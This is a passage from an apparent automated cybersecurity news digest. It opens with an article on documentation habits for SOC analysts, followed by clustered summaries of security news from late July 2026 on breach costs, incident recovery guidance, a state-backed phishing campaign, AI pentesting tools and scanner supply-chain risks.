29 Jul 2026 Blue Team , Guest Author , Informational , SOC Blue Book , Dan Rearden , Infosec for Beginners , InfoSec Survival Guide Report As You Go: Maintaining Good Documentation for SOC Analysts by Dan “Haircutfish” Rearden | haircutfish.com | Guest Author This article was originally published in the InfoSec Survival Guide: Blue Book — SOC Analysts. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Working in the SOC can be a grind. Whether triaging alerts, escalating to clients, or just trying to understand why users download malicious files, we feel the need to get through tickets as fast as possible. But in that rush, we can actually hinder our progress and slow ourselves down. Structure What can we do to make tickets, notes, and escalations aid the SOC in the past, present, and future? Using structure, “building upon,” and clear and concise direction, we can set ourselves and the SOC up for success. In one of Jason Blanchard’s “Job Hunt Like a Hacker” BHIS livestreams, he emphasized using bullet points when listing job experience rather than a big wall of text, as “people will get lost and stop reading.” I took this advice to heart in the way I structure the internal notes of my tickets. I use structured, cascading bullet points to document each step taken and each piece of evidence discovered during triage. This format makes it easy for any teammate to pick up where I left off — or for a lead to QA my work without asking me to explain it. For Example: IP address (123.456.789.10) has a Geolocation of Cold Lake, Alberta, Canada Malicious on AbuseIPDB and VirusTotal AbuseIPDB Link VirusTotal Link Building Upon Now that we know how to structure our notes, what should we actually document? While triaging the alert, begin with steps taken. This could be “- Ran query: {the query itself or link to SIEM platform of query used}”, “- Investigated User’s recent login history”, etc. From there, gather evidence (log data, artifacts, screenshots, etc.) pertaining to the events that occurred and add them to your notes as you discover them. Just because you add something to your notes, doesn’t mean it’s set in silicon (excuse my play on words…). If an event or evidence is not actually linked to the alert, you can remove it. It’s better to capture too much and trim later than to miss something you’ll need to reconstruct hours or days from now. This is a key part of the “Report-As-You-Go” process. Clear and Concise Direction We have our structure and our evidence… now what? It’s time to edit down and proofread what we have in the internal so that it only contains necessary information. Clear away any rabbit holes or evidence not pertinent to the alert in question. Your thought process should be apparent from the information you present. A final bullet point stating your verdict will enhance this clarity, such as “- Atypical behavior of user, will escalate and confirm expected.” Here’s an example of a finished internal update: SentinelOne Query used https:mXdr.AlkaliLakefacility.com/aGFpcmN1dGZpc2guY29t IP address (123.456.789.10) has a Geolocation of Cold Lake, Alberta, Canada User doesn’t typically log in for IP address Malicious on AbuseIPDB and VirusTotal AbuseIPDB Link VirusTotal Link User downloaded 2k files over an hour time frame from the Weapon-X SharePoint https:mXdr.AlkaliLakefacility.com/bWVkaXVtLmNvbS9AaGFpcmN1dGZpc2g= Atypical behavior of user, will escalate and confirm expected With the evidence well-documented and your verdict made, you are set to either update the client or close the ticket, setting everyone up for future success. Documentation Muscle Just like regular muscles, you need to constantly work out your reporting-as-you-go muscles. The more you exercise these muscles, the stronger they become. It’s an ever-improving process: the first couple of internals you create are not going to be great, but you will see improvement the more yo
```

#### Corroborating sources (1)

- **Black Hills Information Security** (detection_response_operations)
  - Title: Report As You Go: Maintaining Good Documentation for SOC Analysts
  - Published: 2026-07-29T14:00:00+00:00
  - Link: https://www.blackhillsinfosec.com/report-as-you-go-soc/
  - Summary: by Dan “Haircutfish” Rearden | haircutfish.com | Guest Author Working in the SOC can be a grind. Whether triaging alerts, escalating to clients, or just trying to understand why users […] The post Report As You Go: Maintaining Good Documentation for SOC Analysts appeared first on Black Hills Information Security, Inc. .

### Cluster 625e7caa10 — score 10

- Title: The Average Cost of a Data Breach Rises to $5 Million
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-07-29T11:00:00+00:00
- Link: https://www.infosecurity-magazine.com/news/cost-of-a-data-breach-5m-ibm/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- affected_industries: financial_services, healthcare, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- affected_industries: healthcare, financial_services, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
IBM Cost of a Data Breach Report warns that the global average cost of a data breach has reached a record high of $4.99m – and AI-backed attacks have played a role
```

#### Full body

```
Infosecurity Magazine Home » News » The Average Cost of a Data Breach Rises to $5 Million The Average Cost of a Data Breach Rises to $5 Million News 29 July 2026 Written by Danny Palmer Deputy Editor , Infosecurity Magazine The average cost of a data breach has risen to almost $5m, analysis of the consequences of cyber incidents which took place during the last year has revealed. The figure was published in the 2026 edition of the annual IBM Cost of a Data Breach Report , released on July 29 , and based on source material from breaches experienced by 602 organizations around the world between March 2025 and February 2026. According to IBM, the global average breach cost climbed 12% during the last year, reaching a record $4.99 million (£3.75m). One key factors behind the financial cost of a data breach or cyber-attack is lost business costs, either as a result of business lost immediately because the incident meaning the organization couldn’t sell products or services, or losing customers in the long run because they have lost trust in the affected organization. Cybercriminals know that this is a significant risk for organizations and are factoring this into their playbooks, especially around ransomware and extortion attacks . While disrupting operations through encryption remains a key tactic, attackers are shifting to other means of applying pressure to victims, such as threatening them with potential damage to brand reputation if an incident goes public in an effort to extort a ransom payment. Of those organizations hit with a ransomware attack, 41% said the attackers used the threat of damage to brand reputation from not being able to provide services or having customer data exposed to pressure the victim into paying. “This shift reflects a move away from purely technical disruption toward multilayered extortion strategies that target trust, public perception and long-term business impact,” said the report. Organizations which are hit by a cyber-attack also experience financial losses due to the escalated costs associated with investigating and responding to an incident. Costs of Data Breaches by Sector The industry which cyber incidents and data breaches are most costly for is healthcare, which for the 13 th consecutive year recorded the highest average breach cost ($6.6m). “Attackers continue to value and target the industry’s patient PII, which can be used for identity theft, insurance fraud and other financial crimes,” warned the report. The financial sector ($6.3m), the industrial sector ($5.5m), the technology industry ($5.5m) and entertainment industry ($5.4m) rounded out the top five sectors which data breaches were most costly during the period. Costly Impact of AI-Powered Attacks The IBM Cost of a Data Breach Report also noted how the rise in the use of AI and Frontier LLMs , both by enterprise organizations and the cybercriminal operations which target them, had an impact on the attack landscape during the reporting period. Over one in four organizations which experienced a malicious attack said it was AI-driven, representing an increase of 56% when compared with the previous year. Victims reported that AI deepfake impersonation attacks and AI-enabled malware incidents were the most common form of AI-enabled attacks during the period. AI driven attacks proved to be a significant factor in the financial cost of an incident. According to IBM, AI-driven attacks added an average of $1m per breach. “AI has dramatically lowered the barrier for cybercriminals. Attackers can now execute attacks in minutes rather than days with advanced frontier models. Organisations need to move faster from reactive security to a continuous autonomous defence if they want to keep up,” said Mark Hughes , global managing partner for cybersecurity services at IBM. According to the study, the risk of AI-based cyber threats is prompting organizations to make additional investments in their cybersecurity strategy, as 85% said they plan to inc
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: The Average Cost of a Data Breach Rises to $5 Million
  - Published: 2026-07-29T11:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/cost-of-a-data-breach-5m-ibm/
  - Summary: IBM Cost of a Data Breach Report warns that the global average cost of a data breach has reached a record high of $4.99m – and AI-backed attacks have played a role

### Cluster 2acf38b121 — score 9

- Title: When cyber attacks happen: helping organisations recover
- Source: NCSC UK (government_authoritative)
- Published: 2026-07-28T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/blogs/when-cyber-attacks-happen-helping-organisations-recover
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
A highly disruptive incident can feel overwhelming. New guidance provides a framework for response and recovery.
```

#### Full body

```
Blog Post Download & print article PDF Download & print article PDF When cyber attacks happen: helping organisations recover A highly disruptive incident can feel overwhelming. New guidance provides a framework for response and recovery. Ralph B PixelsEffect via Getty Images Some say they felt sick. Others say it was like being punched in the stomach. However it hits you, finding out that your organisation is the victim of a highly disruptive cyber attack is a real blow. And as technology evolves and cyber threats continue to grow in scale and sophistication, more organisations are having to prepare for the possibility of serious disruption. Your first reaction is likely to be an emotional one: shock at the news anger that your organisation has been targeted despair as the full impact of the attack becomes clear guilt that the organisation wasn’t as well defended as it could have been All of these feelings – and more – are normal. From day one, victim organisations need to recognise the toll the incident will take on people, work hard to support those dealing with it, and lessen the effects as much as possible. A framework for recovery Our new response and recovery guidance will guide you through a highly disruptive cyber incident. It shows that organisations can and do recover from even the most severe attacks and provides a framework to understand what has happened, deal with the impacts, and move forward to full recovery. The guidance is split into 3 sections, so that you can focus on the key aspects for the challenges you’re facing as your recovery proceeds. The first hours matter First is how to deal with the initial few hours and days, as you’re working out what’s happened, what the impact is and trying to coordinate your actions. It emphasises the importance of swift defensive actions, establishing governance and getting control of communications. It also covers the actions to get onto straight away that will help you further down the line and speed up your recovery. At the NCSC, we see serious cyber incidents all the time so we know the importance of bringing in qualified and experienced help, not just from a technical standpoint but from the reassurance it provides the victim that they're getting the best help available. That’s why we always recommend organisations secure the services of an NCSC-assured Cyber Incident Response (CIR) firm. Building your recovery programme The second stage is focused on building and implementing your recovery programme. This programme is key to getting your organisation back up and running, to minimum viable operations (MVO). Recovering core business functions quickly isn’t just about restoring technology; it’s about enabling the organisation to continue delivering services, supporting customers and maintaining confidence in its operations. All your actions must be driven by a business-led view on your most important business functions. Getting these back up and running, sometimes supported by temporary workarounds, brings you to the end of this second stage. Beyond recovery: rebuilding stronger The last stage is the longer term rebuild. This is a distinct shift from the recovery stage, and focuses on getting the organisation back to business as usual or – better still – stronger than before. It includes ensuring you address the issues that contributed to the incident occurring in the first place, and taking the opportunity to rebuild in a more secure and resilient way. For many organisations, that includes designing and building systems so that fundamentals – such as patching, configuration and access control – are possible and easier to achieve. Prepare before you need it: practice and test Of course, it’s best to prepare and practice for these types of incident in advance. Organisations that act early are often better placed to respond effectively, maintain critical operations and recover more quickly. The guidance will help you develop plans and test your response arrangements befor
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: When cyber attacks happen: helping organisations recover
  - Published: 2026-07-28T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/blogs/when-cyber-attacks-happen-helping-organisations-recover
  - Summary: A highly disruptive incident can feel overwhelming. New guidance provides a framework for response and recovery.

### Cluster 574ebfebeb — score 9

- Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
- Source: NCSC UK (government_authoritative)
- Published: 2026-07-23T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- affected_industries: critical_infrastructure, education, government
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- affected_industries: government, critical_infrastructure, education
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign
```

#### Full body

```
News Download & print article PDF Download & print article PDF UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign Russian state-supported actors develop new technique to target Western email platforms and gain persistent access to compromised networks Organisations provided with trusted advice and support to protect sensitive data in the face of evolving cyber threats Russian state-supported cyber actors have targeted Western organisations with a malicious campaign which uses a zero-click exploit coined “beehive” (or “ Ulej ”) to steal emails, the UK has warned. Today, the National Cyber Security Centre – a part of GCHQ – alongside cyber security agencies in 15 countries, has exposed activities of LAUNDRY BEAR, an advanced persistent threat group who specialise in the covert acquisition of email data. Since July 2025, LAUNDRY BEAR has successfully targeted and stolen sensitive email information from organisations that use Zimbra Collaboration Suite (ZCS) software. US organisations have been targeted in sectors including defence, government, education, energy, law enforcement, media, NGOs and technology. In a new joint advisory , the NCSC and partners warn LAUNDRY BEAR’s ongoing campaign is indicative of espionage and almost certainly carried out with Russian state support. Unlike traditional phishing campaigns, “beehive” allows the threat actors to gain extensive and sustained access to emails without requiring a user’s input. Instead of clicking a link or opening a file, the user only has to view a malicious email within a vulnerable version of the ZCS webmail service to be compromised. Organisations that use ZCS are urged to follow the mitigation advice, including to immediately patch vulnerabilities and improve network monitoring capabilities. The cyber agencies caution that it is likely “beehive” could be adapted to exploit other vulnerabilities. As more organisations update their ZCS software, it is very likely that the group will also look to target other email systems that Western organisations use. The NCSC recommends all UK organisations should sign up to the free Early Warning service for malicious network activity notifications. The government is committed to raising cyber resilience across the UK to protect businesses and safeguard growth. Earlier this month, businesses from every corner of the British economy joined a pledge publicly committing to strengthen their defences in the face of a fast-evolving threat. Today’s action shows we’re working hand-in-hand with our allies to expose Russian state-supported hackers targeting Western organisations. It’s particularly concerning that these thugs tested their methods on victims in Ukraine, before targeting members of NATO. Organisations across the UK should sign up to NCSC’s Early Warning service to ensure they can quickly secure their systems against similar activity. Security Minister, Dan Jarvis MBE This phishing campaign demonstrates how hostile actors will ruthlessly adapt techniques and exploit vulnerable technology in pursuit of their aims to steal sensitive information from Western organisations. With our international partners, we strongly encourage organisations to familiarise themselves with the ‘zero-click’ techniques described in the advisory which could be used against other platforms, and act on the mitigation advice. We will continue to call out malicious cyber activity supported by the Russian state and urge everyone to follow NCSC guidance to raise resilience, including steps to strengthen online account security. Beth Hopkins CMG, NCSC Chief Operating Officer The advisory highlights how these malicious cyber techniques were extensively trialled on Ukrainian victims before use against members of NATO, which is part of a growi
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
  - Published: 2026-07-23T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
  - Summary: GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign

### Cluster b34544d592 — score 9

- Title: AutoIT Payload Injector , (Tue, Jul 28th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-28T07:42:27+00:00
- Link: https://isc.sans.edu/diary/rss/33192
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
For a long time, AutoIT[ 1 ] has been pretty common in the malware ecosystem. Threat actors still use it because it's easy to write and powerful. Indeed, it can perform all the required actions to inject a payload into a remote process as you'll see below.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: AutoIT Payload Injector , (Tue, Jul 28th)
  - Published: 2026-07-28T07:42:27+00:00
  - Link: https://isc.sans.edu/diary/rss/33192
  - Summary: For a long time, AutoIT[ 1 ] has been pretty common in the malware ecosystem. Threat actors still use it because it's easy to write and powerful. Indeed, it can perform all the required actions to inject a payload into a remote process as you'll see below.

### Cluster 2612753693 — score 9

- Title: Scans for ESAFENET CDG 3 Document Management System Weak Logins, (Sun, Jul 26th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-26T15:26:14+00:00
- Link: https://isc.sans.edu/diary/rss/33184
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
ESAFENET&#;x26;#;39;s CDG showed up in our data before. The company focused on secure document management and data leakage prevention solutions. The "CDG" stands for "Content Data Guard", and the product appears to be mostly targeting the Chinese market [1]. Sadly, like so many security products, it suffers from basic security vulnerabilities like SQL Injection, XSS, and default passwords. We have seen scanning for ESAFENET CDG before, in particular after the cross-site scripting vulnerability was made public.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Scans for ESAFENET CDG 3 Document Management System Weak Logins, (Sun, Jul 26th)
  - Published: 2026-07-26T15:26:14+00:00
  - Link: https://isc.sans.edu/diary/rss/33184
  - Summary: ESAFENET&#;x26;#;39;s CDG showed up in our data before. The company focused on secure document management and data leakage prevention solutions. The "CDG" stands for "Content Data Guard", and the product appears to be mostly targeting the Chinese market [1]. Sadly, like so many security products, it suffers from basic security vulnerabilities like SQL Injection, XSS, and default passwords. We have seen scanning for ESAFENET CDG before, in particular after the cross-site scripting vulnerability was made public.

### Cluster 57268d1ce0 — score 9

- Title: When the "Autonomous Attacker" Is Your Own AI Model, (Thu, Jul 23rd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-23T13:40:27+00:00
- Link: https://isc.sans.edu/diary/rss/33180
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Two disclosures, five days apart, described the same intrusion from opposite ends â€” one from the victim, one from the party that turned out to be responsible â€” and together they make one of the more instructive incidents of the year for defenders.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: When the "Autonomous Attacker" Is Your Own AI Model, (Thu, Jul 23rd)
  - Published: 2026-07-23T13:40:27+00:00
  - Link: https://isc.sans.edu/diary/rss/33180
  - Summary: Two disclosures, five days apart, described the same intrusion from opposite ends â€” one from the victim, one from the party that turned out to be responsible â€” and together they make one of the more instructive incidents of the year for defenders.

### Cluster 1d3c72ca3a — score 9

- Title: Stop rewriting detection rules by hand: automatic Sentinel-to-Elastic migration is here
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-07-29T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/sentinel-detection-rules-migration
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Elastic's first automatic migration from a modern SIEM. Translate your Sentinel detection rules into Elastic Security without rebuilding them.
```

#### Full body

```
29 July 2026 • Charles Davison Stop rewriting detection rules by hand: automatic Sentinel-to-Elastic migration is here Elastic's first automatic migration from a modern SIEM. Translate your Sentinel detection rules into Elastic Security without rebuilding them. 4 min read Detection Engineering , Product Updates Elastic automatically translates your Microsoft Sentinel detection rules into Elastic Security. Export your Scheduled and Near Real Time (NRT) analytics rules from Sentinel, upload them, and Elastic picks up the mapping and translation from there using an LLM you choose. Watchlists and severity mappings carry over. This is the first automatic migration path off a modern SIEM, available now in Tech Preview in 9.5, and it works across multiple cloud providers and regions so you can deploy closer to where your data lives. Which Microsoft Sentinel rule types can be migrated automatically? Automatic Migration focuses on the rules that carry your detection logic. In 9.5, it translates Scheduled and Near Real Time (NRT) analytics rules from Microsoft Sentinel, exported from your Sentinel workspace, and handles the translation for you. It uses the same mapping and translation as our existing rule migrations, now extended to Microsoft Sentinel. The following are supported: Integration identification with just rule export Support for the following rule types: Near-real-time (NRT) detection analytics rules Scheduled Analytic Rules Support for Watchlists to ES|QL Lookups Severity Mapping How to migrate Microsoft Sentinel detection rules to Elastic The migration runs in a few steps, from exporting your rules in Sentinel to reviewing the translated versions in Elastic. Once you've decided which rules and data to migrate, follow these steps: On the Security Launchpad, open Manage Automatic Migrations, select your AI provider, and expand Migrate your existing SIEM rules to Elastic. Select the drop-down on the top right for Microsoft Sentinel. Let Elastic guide you through exporting your rules from Sentinel and uploading them into Elastic Security. Elastic handles the finer details by scanning for watchlists and then prompts you to upload them when found. Once the rules are uploaded, you can view their status. Installed: Already added to Elastic SIEM. Click View to manage and enable it. Translated: Ready to install. This rule was mapped to an Elastic-authored rule, or translated by Automatic Import . Click Install to install it. Partially translated: Part of the query could not be translated. You may need to specify an index pattern for the rule query, upload missing files, or fix broken rule syntax. Not translated: None of the original query could be translated. Failed: Translation failed. Refer to the error for details. For more information, refer to the technical documentation . After clicking View Rules, you will have the ability to edit and install rules. Should you migrate rules first or data first? One of the first decisions in a migration is sequencing: data or rules first. Elastic supports both paths, so you can start wherever makes sense for your team. Path When to use What happens Rules first You do not know exactly which data sources to prioritise before moving any logs. Translate your Sentinel rules first. Elastic identifies which integrations those rules need, so you can plan data onboarding around what your detections actually require. Data first Your log sources are already being onboarded, or you want detections to work the moment they're installed. Onboarding data beforehand improves the translation quality. Onboard your log sources into Elastic, then migrate your Sentinel rules to match. Rules can be installed and enabled immediately against data that's already flowing. Custom data You have proprietary or non-standard log sources that don't map to a prebuilt Elastic integration. Use Automatic Import to ingest custom data sources in minutes, then migrate or write rules against them. By identifying exactly which integra
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: Stop rewriting detection rules by hand: automatic Sentinel-to-Elastic migration is here
  - Published: 2026-07-29T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/sentinel-detection-rules-migration
  - Summary: Elastic's first automatic migration from a modern SIEM. Translate your Sentinel detection rules into Elastic Security without rebuilding them.

### Cluster ceed356098 — score 9

- Title: The Wiz Red Agent is Now Generally Available
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-07-29T12:50:56+00:00
- Link: https://www.wiz.io/blog/wiz-red-agent-is-ga
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Continuously uncover complex, exploitable risks to stay ahead in the AI Threat Era with the Red Agent
```

#### Full body

```
Wiz Pricing Get a demo Get a demo We are excited to announce that Red Agent is now generally available (GA) . Customers have rapidly adopted our AI attacker to close the widening gap between traditional security scanners and the speed at which adversaries exploit vulnerabilities using AI. Its impact was clear during preview: Over 10,000 validated critical exploitable risks were discovered by the Red Agent- externally facing risks with no authentication- that, if found by attackers, could have led to a significant impact. 70% of organizations that enabled Red Agent discovered a High or Critical vulnerability they were completely unaware of. 35% of organizations found their first verified Critical vulnerability within 1 hour of activating scans. Proven scale : At its peak, Red Agent scanned 350,000 assets and processed 480B tokens in a single day. Behind these numbers are our customers transforming how they defend with AI: The Red Agent for attack surface management and automated penetration testing is incredibly valuable. We didn't have coverage over infrastructure-related automated pen testing prior to Wiz. Patrick O’Boyle, Founding security engineer and Head of GRC, Rogo Red Agent finds what humans miss. It caught critical authorization flaws across services where traditional testing and our bug bounty program came up short. We had continuous AI-powered attack surface testing on our roadmap. Wiz got there first, and did it better than we would have. Emil Vaagland, Head of Product Security, Vend The New Reality: Why AI Threat Readiness Matters Now Attackers are using frontier AI models to scan perimeters, discover zero-days, and weaponize complex application vulnerabilities in hours instead of months. Relying purely on human-paced security workflows against AI-speed adversaries creates a compounding coverage deficit. Staying ahead of this pace requires deploying AI for defense. Organizations are prioritizing AI Threat Readiness to outpace automated adversaries, yet existing security security scanning has limitations: Static scanners miss logic flaws : Traditional tools rely on known CVEs and signature matching. They cannot reason about custom application workflows, broken access controls, or multi-step logic flaws in modern web applications and AI-generated code. Manual penetration testing does not scale : Identifying complex business logic vulnerabilities historically required manual testing. These engagements are expensive, take weeks to execute, and offer limited scope. Point-in-time testing creates security gaps : A manual pentest or annual audit captures a single snapshot in time. The moment new code ships or an API updates, new unmonitored security gaps open up. AI Defense with the Red Agent Red Agent helps teams stay ahead by running continuous, autonomous AI pentesting across custom-built software, vibe-coded applications, and APIs. While traditional scanners match signatures, Red Agent reasons through business logic to uncover unknown vulnerabilities such as OWASP API Top 10 Flaws, logic flaws, authorization bypasses, and more. The Red Agent Modules 1. Web API Crawler: Uncover shadow APIs An intelligent AI discovery tool that uses client-side code analysis to map API endpoints across your web applications and uncover hidden APIs. It automatically extracts and analyzes API specifications to understand endpoint structures, parameters, and expected behaviors and identifies unlinked or forgotten APIs that expose your organization to risk. 2. API DAST Attacker: Continuously find logic-driven vulnerabilities Continuously uncovers and validates logic-driven exploitable risks by analyzing application behavior rather than following fixed scan patterns and static test cases. It treats target applications as dynamic systems, adapting its strategy in real time to reason about application logic and expose logic-driven risks. It then provides proofs of execution so your team receives verified findings, alongside reproduction steps.
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: The Wiz Red Agent is Now Generally Available
  - Published: 2026-07-29T12:50:56+00:00
  - Link: https://www.wiz.io/blog/wiz-red-agent-is-ga
  - Summary: Continuously uncover complex, exploitable risks to stay ahead in the AI Threat Era with the Red Agent

### Cluster dfb5d8c3f5 — score 9

- Title: When AppSec Scanners Become a Supply Chain Attack Vector
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-29T17:06:52+00:00
- Link: https://www.darkreading.com/application-security/when-appsec-scanners-become-supply-chain-attack-vector
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, supply_chain
- actor_attribution: TeamPCP
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, credential_theft
- actor_attribution: TeamPCP
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
New research shows how security scanners embedded in the software supply chain can be attacked to serve as a foothold for downstream attacks.
```

#### Full body

```
Application Security Cyber Risk Cybersecurity Operations Сloud Security News, news analysis, and commentary on the latest trends in cybersecurity technology. When AppSec Scanners Become a Supply Chain Attack Vector New research shows how security scanners embedded in the software supply chain can be attacked to serve as a foothold for downstream attacks. Ericka Chickowski , Contributing Writer , Dark Reading July 29, 2026 5 Min Read Source: IncrediVFX via Shutterstock Specialized application security scanning tools embedded in the development pipeline can do wonders to harden code and bolster software supply chain security. But if engineering teams aren't careful, these security scanners can also become a gateway for attacks deep in the supply chain. Last spring, the development and security worlds saw that scenario play out with broad supply chain attacks that compromised development environments for two different security open source projects, which served up poisoned versions of Trivy and KICS to unsuspecting software engineering teams. The attacks were part of broader supply chain attacks by TeamPCP to commit widespread credential theft and fraud. Next week, during the Black Hat USA conference in Las Vegas, another security researcher will demonstrate a different way attackers can use security tools to their advantage. This attack takes less effort, as it doesn't require full compromise of the vendor's development environment. All it takes is asking the tool to do a scan and feeding it a specially crafted malicious code repository. Related: Robinhood Cuts Access Approval Time to Support High-Velocity Development The research in question was conducted by the security team at ZeroPath, which investigated the susceptibility of 20 unnamed security vendors and identified significant findings with five of them. One of them even awarded the researchers the maximum-sized bug bounty for their discoveries. "Most of the findings disclosed sensitive secrets like cloud credentials. One included the production database. Some included the Docker and GitHub personal access token for the actual developer that worked at the vendor," says Raphael Karger, co-founder and CTO for ZeroPath, who will be leading the session next week to dive into the details. "These instances could have reached customers that thought they were secure." It Started with a Sketchy Probe The genesis of the research all started with an alert that Karger's team ran down late last year in their own environment. They picked up some evidence of a failed scan in their production monitoring software that looked suspicious. "It was referencing a file that was trying to read something outside of the scope of its current repository. And the file it was trying to read could have potentially had sensor credentials, et cetera," he says. "We detected this proactively, and we began investigating the repository." By looking at a few artifacts from the repository, the team found that an attacker was systematically testing the surface of the firm's hosted security product. The attacker examined how ZeroPath's scanning tools dealt with arbitrary files, dependency handling procedures, and secrets handling. The probe was so intriguing that Karger and his team decided right then to build a tool that would pick up where this exploratory probe left off and test their own environment for defects in the same processing surfaces the bad guys were apparently interested in. Related: For Enterprises, Security Remains Agentic AI's Biggest Challenge The team built off the idea that repository analysis may not always be a read-only function. Many scanners execute code and examine files that could be used to force the execution of code, depending on how they process those files. It comes back to the age-old AppSec issue of executing untrusted content. If the scanner processes it without isolation, that could allow an attacker to present unexpected content that causes the scanner to not only read a fil
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: When AppSec Scanners Become a Supply Chain Attack Vector
  - Published: 2026-07-29T17:06:52+00:00
  - Link: https://www.darkreading.com/application-security/when-appsec-scanners-become-supply-chain-attack-vector
  - Summary: New research shows how security scanners embedded in the software supply chain can be attacked to serve as a foothold for downstream attacks.

### Cluster bd4bee8cf9 — score 9

- Title: Accuris uses AI to improve BOM decisions and supply chain resilience
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-07-29T09:04:26+00:00
- Link: https://www.helpnetsecurity.com/2026/07/29/accuris-bom-intelligence/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: government, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Accuris has announced new AI capabilities for BOM Intelligence, part of its Supply Chain Intelligence suite. The launch gives engineering, procurement and supply chain teams a clearer way to move from spotting component risk to acting on it: catching obsolescence early, closing compliance gaps and governing sourcing decisions across programs. Every capability runs on the same foundation: verified data covering 1.3 billion electronic components at 98%+ accuracy, built on 35+ years of direct manufacturer relationships … More → The post Accuris uses AI to improve BOM decisions and supply chain resilience appeared first on Help Net Security .
```

#### Corroborating sources (1)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Accuris uses AI to improve BOM decisions and supply chain resilience
  - Published: 2026-07-29T09:04:26+00:00
  - Link: https://www.helpnetsecurity.com/2026/07/29/accuris-bom-intelligence/
